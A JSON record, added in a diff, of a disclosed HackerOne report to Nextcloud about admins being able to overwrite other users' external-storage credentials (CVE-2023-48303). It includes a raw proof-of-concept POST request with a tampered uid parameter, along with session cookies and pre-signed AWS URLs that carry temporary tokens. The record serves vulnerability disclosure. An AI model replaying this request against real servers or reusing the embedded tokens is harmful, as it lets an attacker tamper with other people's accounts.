@@ -1,0 +1,184 @@
+{
+  "id": 2107934,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTA3OTM0",
+  "url": "https://hackerone.com/reports/2107934",
+  "title": "Admins can change authentication details of user configured external storage",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2023-08-14T00:12:27.375Z",
+  "submitted_at": "2023-08-14T00:12:27.454Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "st0nzyy",
+    "url": "/st0nzyy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hbpbzoq0zemjb620oxgquufdjdcn/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-48303"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-12-21T05:17:43.612Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-11-21T05:17:40.107Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nAfter some testing in nextcloud server, i found improper access control make users in admin group to change any \"Global credentials\" for admin/user external storage\n\nNote* this issue affect ```admin to admin & admin to user.```\n\n## Steps To Reproduce:\n\n- As a malicious admin user\n- Navigate to External storage\n- At the global credentials input any random valid credentials for example POC:anything\n- Intercept the following request\n```\nPOST /nextcloud/index.php/apps/files_external/globalcredentials HTTP/1.1\nHost: 192.168.56.103\nContent-Length: 43\nAccept: application/json, text/javascript, */*; q=0.01\nrequesttoken: fFwUgm3xqnKq1YBdX5pj8eskJP+6VwfEYSUkhdEbADE=:GQwn4z6nyTrCuOVtbe9Vg6pnfIf/HXezJhNU3P50bFQ=\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\nOCS-APIREQUEST: true\nContent-Type: application/json\nOrigin: http://192.168.56.103\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: oc_sessionPassphrase=B4MUb9O8t71%2BDkT%2FXpeTcrJgb5FoSTRXXKwlRJTJKQ027je%2F7KT2XbFCPs6hU4WgjzTv6iQ1GZfwvVXQ7QsiBM%2FJL5pKT8W4yj4ZU237V4yWGWCERO8hHjEYCnHSp671; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc6xi9hj9sei=irdv8ml4hrgm7gg57v104tj20t; nc_username=nvz; nc_token=o4gwXiPvdr4j3Ba7glzBLoN%2FdhDu6Uvo; nc_session_id=irdv8ml4hrgm7gg57v104tj20t\nConnection: close\n\n{\"uid\":\"nvz\",\"user\":\"nvz\",\"password\":\"123\"}\n```\n\n- Change the ```uid``` parameter to any other user or  admin \n\n- As a result we notice the following response\n```true```\n- And by navigating to the user effected we notice the Global Credentials been changed\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n  * [attachment / reference]\n\nhttps://docs.nextcloud.com/server/27/admin_manual/configuration_files/external_storage_configuration_gui.html#storage-configuration\n\n## Impact\n\nusers in admin group can change any \"Global credentials\" for admin/user external storage",
+  "bounty_amount": "100.0",
+  "formatted_bounty": "$100",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2598321,
+      "file_name": "users-groups.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4h8v8xmak7idnsart5z0d7caelol?response-content-disposition=attachment%3B%20filename%3D%22users-groups.jpg%22%3B%20filename%2A%3DUTF-8%27%27users-groups.jpg&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ43X7AVE6%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143844Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDznDy3u4j3aU1sms08KaMsM2p6nJOQrLe%2BCTfeWWCkSwIhAN48aveVhvKijHDcGElNAxLhza0KLS1LZpPsSe93o0ybKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgwvK7%2FEh50UvTXqd%2BwqjwVxALUb2SGRm7B6YVLCblNNJeLEYMP9eIFwrJx2n6mICmSbIypS9B3yAvnt1%2BfS1D83t7Rn1VdVWYB61ugOxItGvtspBCQbXB1pAL3PJp%2B0MLQAKAmma7ose%2F1rTL8LmERwMc3DMPMz1BxbiV5ymD1yhwLenC4zB4Mi8qZbidecDuh5nIlhdqF13XV%2B6KAm8QxD1BYrGzLH5N8f1uIpHfSlVg9b3RaGqG7tXatKEc%2B0kWfbfUKqD9%2B%2FL2XfbnPwDH1S%2BUX%2FyzPVW3JjJKYXhEss2yUFN6Tq9n9CoByuvA%2FYcrxiazMFwRBj5yJetai%2FnnCY8chCHiy9HZQjOkoREByf9TIt%2FSn9%2BVx0bD6%2FffrCjAtZLSC2UpZhTy4nVEe8y1%2FIbu6x2%2FOmY2betwfiloRXuJGAbh7Y0Mzp7IdJoZ6MaFPx2YupBJcGkKwsazmjVgOGT9CCe2KX4O6FLZT%2FF04eYIAqylXx69Q0SJ4J%2Br3RqGHy%2FzI47AhETUW%2Bi4lZLQ0wDIbveIUxwP1kgMxwuVQS6N%2FiLcZe0zSnootH4Lg99WNWg1Po6rwj5rMTmspG8l6UeqsgAslqfH%2FmHKcyFo%2FGR59%2FTJAN00M3F0ALdFU2wmz%2FW16CObf08RwhGO53QGyZZudBb%2BChF%2BpPNPqSngXXSYwU2rO2N8xnjsyOSK66xMWefmZRHPT7taGtLN6EJZMVT1mD6FBLF3ox%2BOYe2XQHl%2FdMCrnAd9QUx63EfvaiCO1DfgwvG0hm%2FZWbTYdIz1nAGAFtW%2FKlljmoQkXVyuC9Qqh%2BXa4VNGPK4dkoFjWqC6MdHke4pQdrA45BsaV1miTY8BuEGuVLO6T6c%2BABWwLNbYlTCqMQboOp5OZ462crMOfdra4GOrABu16tnzpO9sY5jSfF4SRn89CN5OTZwIwBghBLVe9PUEJnt4KrBEP0pTNIIOd3sKPaeVHx4e0zt6lMfhuxqLIxMx6DGzDq96UYpkaP6lrsHHfJx8Ry2vyAV6vtzyL98gbyqNKLq%2FoUPM3Cyq8LSy5CEIjU%2FHaV%2B0M8dW2L8Uj8HH0cWoRL%2FQiBHOoEB8WaQyBZi2Ijbeu6e2CUfWR%2FeGa2O6X3Hq4au7KLmZHgx6sJOqA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0ef2ca2c398e122a1d82964921a7fb77f7dce84acb453ba56c90f96fb6811299",
+      "file_size": 17065,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2598322,
+      "file_name": "externalstorage.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eo9j4p0tty0x3trbdyrqri6l0kc9?response-content-disposition=attachment%3B%20filename%3D%22externalstorage.png%22%3B%20filename%2A%3DUTF-8%27%27externalstorage.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ43X7AVE6%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143844Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDznDy3u4j3aU1sms08KaMsM2p6nJOQrLe%2BCTfeWWCkSwIhAN48aveVhvKijHDcGElNAxLhza0KLS1LZpPsSe93o0ybKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgwvK7%2FEh50UvTXqd%2BwqjwVxALUb2SGRm7B6YVLCblNNJeLEYMP9eIFwrJx2n6mICmSbIypS9B3yAvnt1%2BfS1D83t7Rn1VdVWYB61ugOxItGvtspBCQbXB1pAL3PJp%2B0MLQAKAmma7ose%2F1rTL8LmERwMc3DMPMz1BxbiV5ymD1yhwLenC4zB4Mi8qZbidecDuh5nIlhdqF13XV%2B6KAm8QxD1BYrGzLH5N8f1uIpHfSlVg9b3RaGqG7tXatKEc%2B0kWfbfUKqD9%2B%2FL2XfbnPwDH1S%2BUX%2FyzPVW3JjJKYXhEss2yUFN6Tq9n9CoByuvA%2FYcrxiazMFwRBj5yJetai%2FnnCY8chCHiy9HZQjOkoREByf9TIt%2FSn9%2BVx0bD6%2FffrCjAtZLSC2UpZhTy4nVEe8y1%2FIbu6x2%2FOmY2betwfiloRXuJGAbh7Y0Mzp7IdJoZ6MaFPx2YupBJcGkKwsazmjVgOGT9CCe2KX4O6FLZT%2FF04eYIAqylXx69Q0SJ4J%2Br3RqGHy%2FzI47AhETUW%2Bi4lZLQ0wDIbveIUxwP1kgMxwuVQS6N%2FiLcZe0zSnootH4Lg99WNWg1Po6rwj5rMTmspG8l6UeqsgAslqfH%2FmHKcyFo%2FGR59%2FTJAN00M3F0ALdFU2wmz%2FW16CObf08RwhGO53QGyZZudBb%2BChF%2BpPNPqSngXXSYwU2rO2N8xnjsyOSK66xMWefmZRHPT7taGtLN6EJZMVT1mD6FBLF3ox%2BOYe2XQHl%2FdMCrnAd9QUx63EfvaiCO1DfgwvG0hm%2FZWbTYdIz1nAGAFtW%2FKlljmoQkXVyuC9Qqh%2BXa4VNGPK4dkoFjWqC6MdHke4pQdrA45BsaV1miTY8BuEGuVLO6T6c%2BABWwLNbYlTCqMQboOp5OZ462crMOfdra4GOrABu16tnzpO9sY5jSfF4SRn89CN5OTZwIwBghBLVe9PUEJnt4KrBEP0pTNIIOd3sKPaeVHx4e0zt6lMfhuxqLIxMx6DGzDq96UYpkaP6lrsHHfJx8Ry2vyAV6vtzyL98gbyqNKLq%2FoUPM3Cyq8LSy5CEIjU%2FHaV%2B0M8dW2L8Uj8HH0cWoRL%2FQiBHOoEB8WaQyBZi2Ijbeu6e2CUfWR%2FeGa2O6X3Hq4au7KLmZHgx6sJOqA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=441726cddb85ea5ab781907514b5c4b1c945b8419b59931408741f6260c11b0e",
+      "file_size": 18051,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2598323,
+      "file_name": "full-image.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ss6my9ptz4k2ticxs8ojopfxor46?response-content-disposition=attachment%3B%20filename%3D%22full-image.JPG%22%3B%20filename%2A%3DUTF-8%27%27full-image.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ43X7AVE6%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143844Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDznDy3u4j3aU1sms08KaMsM2p6nJOQrLe%2BCTfeWWCkSwIhAN48aveVhvKijHDcGElNAxLhza0KLS1LZpPsSe93o0ybKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgwvK7%2FEh50UvTXqd%2BwqjwVxALUb2SGRm7B6YVLCblNNJeLEYMP9eIFwrJx2n6mICmSbIypS9B3yAvnt1%2BfS1D83t7Rn1VdVWYB61ugOxItGvtspBCQbXB1pAL3PJp%2B0MLQAKAmma7ose%2F1rTL8LmERwMc3DMPMz1BxbiV5ymD1yhwLenC4zB4Mi8qZbidecDuh5nIlhdqF13XV%2B6KAm8QxD1BYrGzLH5N8f1uIpHfSlVg9b3RaGqG7tXatKEc%2B0kWfbfUKqD9%2B%2FL2XfbnPwDH1S%2BUX%2FyzPVW3JjJKYXhEss2yUFN6Tq9n9CoByuvA%2FYcrxiazMFwRBj5yJetai%2FnnCY8chCHiy9HZQjOkoREByf9TIt%2FSn9%2BVx0bD6%2FffrCjAtZLSC2UpZhTy4nVEe8y1%2FIbu6x2%2FOmY2betwfiloRXuJGAbh7Y0Mzp7IdJoZ6MaFPx2YupBJcGkKwsazmjVgOGT9CCe2KX4O6FLZT%2FF04eYIAqylXx69Q0SJ4J%2Br3RqGHy%2FzI47AhETUW%2Bi4lZLQ0wDIbveIUxwP1kgMxwuVQS6N%2FiLcZe0zSnootH4Lg99WNWg1Po6rwj5rMTmspG8l6UeqsgAslqfH%2FmHKcyFo%2FGR59%2FTJAN00M3F0ALdFU2wmz%2FW16CObf08RwhGO53QGyZZudBb%2BChF%2BpPNPqSngXXSYwU2rO2N8xnjsyOSK66xMWefmZRHPT7taGtLN6EJZMVT1mD6FBLF3ox%2BOYe2XQHl%2FdMCrnAd9QUx63EfvaiCO1DfgwvG0hm%2FZWbTYdIz1nAGAFtW%2FKlljmoQkXVyuC9Qqh%2BXa4VNGPK4dkoFjWqC6MdHke4pQdrA45BsaV1miTY8BuEGuVLO6T6c%2BABWwLNbYlTCqMQboOp5OZ462crMOfdra4GOrABu16tnzpO9sY5jSfF4SRn89CN5OTZwIwBghBLVe9PUEJnt4KrBEP0pTNIIOd3sKPaeVHx4e0zt6lMfhuxqLIxMx6DGzDq96UYpkaP6lrsHHfJx8Ry2vyAV6vtzyL98gbyqNKLq%2FoUPM3Cyq8LSy5CEIjU%2FHaV%2B0M8dW2L8Uj8HH0cWoRL%2FQiBHOoEB8WaQyBZi2Ijbeu6e2CUfWR%2FeGa2O6X3Hq4au7KLmZHgx6sJOqA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1d8bdcbb451deffd6a6b0cdf8ef6597765137961b7635e267ab0a8681c3ba210",
+      "file_size": 113955,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-12-21T05:17:40.227Z",
+  "allow_singular_disclosure_after": -4699264.14699821,
+  "singular_disclosure_allowed": true,
+  "vote_count": 24,
+  "voters": [
+    "shreyaschavhan",
+    "muslimfrompk",
+    "zy9ard3",
+    "shubham_srt",
+    "hackduty",
+    "bdogm66",
+    "hack_down_under",
+    "latenighthunter",
+    "369universewealthmoneymakker",
+    "ghannu0x01",
+    "and 14 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 2.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 222969,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/external",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 375405,
+      "category": "team",
+      "content": "Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-2448-44rp-c7hh",
+      "user": {
+        "id": 89223,
+        "username": "nickvergessen",
+        "name": "Joas Schilling",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "Germany",
+        "created_at": "2016-07-01T08:17:59.061Z",
+        "url": "https://hackerone.com/nickvergessen",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
